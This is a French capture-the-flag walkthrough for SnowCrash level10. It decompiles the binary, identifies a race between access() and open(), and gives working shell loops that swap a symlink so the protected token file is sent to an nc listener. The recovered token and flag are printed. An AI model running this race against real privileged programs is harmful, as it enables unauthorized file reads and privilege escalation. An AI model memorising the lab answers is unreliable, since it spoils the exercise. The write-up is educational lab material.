Il y a deux fichiers, un binaire et un fichier token le token est en rw.
En éxécutant le binaire on recoit un message d'erreur.

```bash 
level10@SnowCrash:~$ ./level10 token 127.0.0.1
You don't have access to token
```
on extrait le binaire avec `scp` et on le décompile avec `ghidra` pour voir le code source.
```bash
scp -P 4242 level10@127.0.0.1:/home/user/level10/level10 .
```

```bash
void main(int param_1,undefined4 *param_2)
{
  char *__cp;
  uint16_t uVar1;
  int iVar2;
  int iVar3;
  ssize_t sVar4;
  size_t __n;
  int *piVar5;
  char *pcVar6;
  int in_GS_OFFSET;
  undefined local_1024 [4096];
  sockaddr local_24;
  int local_14;
  
  local_14 = *(int *)(in_GS_OFFSET + 0x14);
  if (param_1 < 3) {
    printf("%s file host\n\tsends file to host if you have access to it\n",*param_2);
                    /* WARNING: Subroutine does not return */
    exit(1);
  }
  pcVar6 = (char *)param_2[1];
  __cp = (char *)param_2[2];
  iVar2 = access((char *)param_2[1],4);
  if (iVar2 == 0) {
    printf("Connecting to %s:6969 .. ",__cp);
    fflush(stdout);
    iVar2 = socket(2,1,0);
    local_24.sa_data[2] = '\0';
    local_24.sa_data[3] = '\0';
    local_24.sa_data[4] = '\0';
    local_24.sa_data[5] = '\0';
    local_24.sa_data[6] = '\0';
    local_24.sa_data[7] = '\0';
    local_24.sa_data[8] = '\0';
    local_24.sa_data[9] = '\0';
    local_24.sa_data[10] = '\0';
    local_24.sa_data[0xb] = '\0';
    local_24.sa_data[0xc] = '\0';
    local_24.sa_data[0xd] = '\0';
    local_24.sa_family = 2;
    local_24.sa_data[0] = '\0';
    local_24.sa_data[1] = '\0';
    local_24.sa_data._2_4_ = inet_addr(__cp);
    uVar1 = htons(0x1b39);
    local_24.sa_data._0_2_ = uVar1;
    iVar3 = connect(iVar2,&local_24,0x10);
    if (iVar3 == -1) {
      printf("Unable to connect to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    sVar4 = write ( iVar2,".*( )*.\n",8);
    if (sVar4 == -1) {
      printf("Unable to write banner to host %s\n",__cp);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    printf("Connected!\nSending file .. ");
    fflush(stdout);
    iVar3 = open(pcVar6,0);
    if (iVar3 == -1) {
      puts("Damn. Unable to open file");
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    __n = read(iVar3,local_1024,0x1000);
    if (__n == 0xffffffff) {
      piVar5 = __errno_location();
      pcVar6 = strerror(*piVar5);
      printf("Unable to read from file: %s\n",pcVar6);
                    /* WARNING: Subroutine does not return */
      exit(1);
    }
    write(iVar2,local_1024,__n);
    puts("wrote file!");
  }
  else {
    printf("You don\'t have access to %s\n",pcVar6);
  }
  if (local_14 != *(int *)(in_GS_OFFSET + 0x14)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return;
}
```
On voit que le binaire se connecte à une socket sur le port `6969` et envoie le contenu du fichier passé en argument.

Dans le code nous voyons aussi que le binaire essaye d'accéder au fichier passé en argument avec la fonction `access` et si l'accès est refusé il affiche un message d'erreur. puis il essaye d'ouvrir le fichier avec la fonction `open`,si l'ouverture est refusée il affiche un message d'erreur, autrement il print le contenu du fichier dans le socket.

Nous allons reproduire la faille TOUCTOU qui consiste à envoyer un lien symbolique vers le fichier `token` qui est en `rw` pour le user `level10` et d'essayer de lire en continue le fichier. Le léger timing entre le access et open nous permettra en forçant d'y accéder.

On se connecte au port `6969` avec `nc`

```bash
level10@SnowCrash:~$ nc -l 6969
```

Via un autre terminal nous créons un lien symbolique vers le fichier `token` dans le répertoire `/tmp` et nous le nommons `level11` en boucle.

```bash
while true; do ln -fs /home/user/level10/level10 /tmp/level11tmp; ln -sf /home/user/level10/token /tmp/level11tmp; done
```
Et avec un dernier terminal  nous lançons le binaire `level10` avec le lien symbolique `level11` en boucle.

```bash
while true; do ./level10 /tmp/level11tmp 10.0.2.15; done
```

Sur le terminal ou nous avons lancé `nc` nous voyons le contenu du fichier `token` s'afficher.

```bash
level10@SnowCrash:~$ nc -l 6969

.*( )*.
woupa2yuojeeaaed06riuj63c
```
Nous nous connectons au user `flag10` et nous faisons le `getflag`.

```bash
flag10@SnowCrash:~$ getflag
Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

